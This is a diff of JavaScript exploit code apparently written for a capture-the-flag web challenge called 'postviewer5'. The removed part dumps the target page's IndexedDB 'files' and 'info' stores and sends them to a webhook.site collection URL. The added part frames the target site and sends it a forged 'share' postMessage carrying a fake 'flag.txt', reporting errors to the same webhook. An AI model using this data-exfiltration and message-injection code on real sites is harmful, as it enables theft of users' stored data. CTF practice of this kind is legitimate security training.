@@ -1,4 +1,5 @@
-WEBHOOK = "https://webhook.site/22adc411-5a6c-4d97-87b6-8c2f641bdb6c";
+const WEBHOOK = "https://webhook.site/22adc411-5a6c-4d97-87b6-8c2f641bdb6c";
+const URL = "https://sehrxn27-postviewer5-ff.instancer.2025.ctfcompetition.com";
 
 function post(url, data) {
   let xhr = new XMLHttpRequest();
@@ -6,38 +7,38 @@ function post(url, data) {
   return xhr.send(JSON.stringify(data));
 }
 
-(async () => {
-  const request = indexedDB.open("Files", 1);
-  request.onsuccess = async () => {
-    const db = request.result;
+try {
+  // Create an iframe element
+  const iframe = document.createElement("iframe");
 
-    const readStore = (storeName) => {
-      return new Promise((resolve, reject) => {
-        try {
-          const tx = db.transaction(storeName, "readonly");
-          const store = tx.objectStore(storeName);
-          const req = store.getAll();
-          req.onsuccess = () => resolve(req.result);
-          req.onerror = () => reject(req.error);
-        } catch (error) {
-          post(WEBHOOK + "?error", { ...error, storeName });
-        }
-      });
-    };
+  // Set the source of the iframe
+  iframe.src = URL;
+  iframe.style.width = "600px"; // Set width as needed
+  iframe.style.height = "400px"; // Set height as needed
 
-    const files = await readStore("files");
-    const info = await readStore("info");
+  // Append the iframe to the body (or any other container)
+  document.body.appendChild(iframe);
 
-    console.log("=== IndexedDB Dump ===");
-    console.log("Files Store:", files);
-    console.log("Info Store:", info);
+  // Function to send a post message to the iframe
+  function sendMessageToIframe() {
+    const blob = new Blob(["toto"], { type: "text/plain" });
+    iframe.contentWindow.postMessage(
+      {
+        type: "share",
+        files: [
+          {
+            blob,
+            cached: false,
+            name: "flag.txt",
+          },
+        ],
+      },
+      "*",
+    );
+  }
 
-    post(WEBHOOK + "?success", files);
-    post(WEBHOOK + "?success", info);
-  };
-  request.onerror = (event) => {
-    console.error("Why didn't you allow my web app to use IndexedDB?!");
-
-    post(WEBHOOK + "?error", event);
-  };
-})();
+  // Call the function to send the message
+  sendMessageToIframe();
+} catch (error) {
+  post(WEBHOOK, error);
+}
